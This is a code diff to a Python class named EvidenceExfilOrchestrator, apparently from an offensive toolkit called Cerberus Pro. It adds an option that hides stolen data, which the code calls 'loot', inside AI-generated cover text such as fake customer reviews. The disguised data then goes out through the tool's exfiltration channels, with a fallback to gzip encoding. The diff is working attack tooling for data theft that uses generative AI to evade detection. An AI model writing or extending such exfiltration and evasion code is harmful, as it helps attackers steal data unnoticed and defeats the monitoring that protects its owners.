@@ -127,6 +127,8 @@ class EvidenceExfilOrchestrator:
         target: str,
         filename: str,
         preferred_channel: ExfilChannel = ExfilChannel.AUTO,
+        use_ai: bool = False,
+        theme: str = 'customer_review',
     ) -> ExfilResult:
         """
         Exfiltrate data via the best available channel.
@@ -150,7 +152,7 @@ class EvidenceExfilOrchestrator:
             )
 
         # 2. Prepare Data (Compress + Wrap)
-        payload = self._prepare_payload(data, filename)
+        payload = await self._prepare_payload(data, filename, use_ai, theme)
 
         # 3. Channel Selection & Execution with fallback
         start_time = asyncio.get_event_loop().time()
@@ -198,14 +200,34 @@ class EvidenceExfilOrchestrator:
         else:
             raise ValueError(f"Unsupported channel: {channel}")
 
-    def _prepare_payload(self, data: bytes, filename: str) -> bytes:
-        """Compress and wrap data with metadata."""
+    async def _prepare_payload(self, data: bytes, filename: str, use_ai: bool = False, theme: str = 'customer_review') -> bytes:
+        """Compress and wrap data with metadata, or use generative steganography."""
         meta = {
             "filename": filename,
             "size": len(data),
             "session_id": self.session_id,
             "content": base64.b64encode(data).decode(),
         }
+        
+        if use_ai:
+            from backend.core.cortex_ai import hide_in_plain_sight
+            logger.info(f"Aplicando Esteganografía AI (Tema: {theme})...")
+            loot_str = json.dumps(meta)
+            stego_text = await hide_in_plain_sight(loot_str, theme=theme)
+            if stego_text:
+                from backend.core.events import CerberusBroadcaster
+                import asyncio
+                asyncio.create_task(
+                    CerberusBroadcaster.broadcast_ws_message(
+                        "CERBERUS_PRO",
+                        "ai_telemetry",
+                        f"🧠 [Steganography] Ocultando {len(loot_str)} bytes de datos en texto ('{theme}')..."
+                    )
+                )
+                return stego_text.encode("utf-8")
+            else:
+                logger.warning("AI Steganography failed, falling back to standard encoding.")
+                
         json_bytes = json.dumps(meta).encode()
         compressed = gzip.compress(json_bytes)
         return compressed
